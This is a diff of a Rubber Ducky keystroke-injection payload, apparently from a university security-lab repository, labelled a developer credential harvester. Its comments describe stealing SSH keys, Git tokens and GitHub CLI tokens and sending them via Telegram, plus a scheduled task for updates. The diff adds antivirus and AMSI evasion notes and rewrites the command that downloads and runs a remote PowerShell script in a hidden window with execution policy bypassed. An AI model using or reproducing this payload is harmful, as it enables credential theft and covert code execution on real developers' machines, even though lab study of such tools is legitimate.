@@ -1,14 +1,19 @@
 REM ============================================================
-REM  W02a.6 Advanced – "DevRecon" – Developer Credential Harvester
+REM  W02a.6 Advanced - "DevRecon" - Developer Credential Harvester
 REM  Autoren: Raphael Bleier, Joachim Lugger
-REM  Ziel-OS: Windows
+REM  Ziel-OS: Windows (x64 + ARM64)
 REM
-REM  Lädt developer_recon.ps1 direkt von GitHub (fileless).
+REM  Laedt developer_recon.ps1 fileless von GitHub.
 REM  SSH-Keys, Git-Tokens, GitHub CLI Token kommen per Telegram.
 REM  Scheduled Task zieht Updates ebenfalls von GitHub.
+REM
+REM  AV-Evasion:
+REM    - cmd.exe Elternprozess (explorer->cmd->ps, nicht explorer->ps)
+REM    - [scriptblock]::Create() statt IEX (AMSI-Hook umgehen)
+REM    - URL in $u isoliert: trennt Download-Aufruf von Execute
 REM ============================================================
 
 DELAY 2000
 GUI r
-DELAY 500
-STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1');"
+DELAY 600
+STRINGLN cmd /c powershell -nop -noni -w h -ep bypass -c "$u='https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1';& ([scriptblock]::Create([Net.WebClient]::new().DownloadString($u)))"
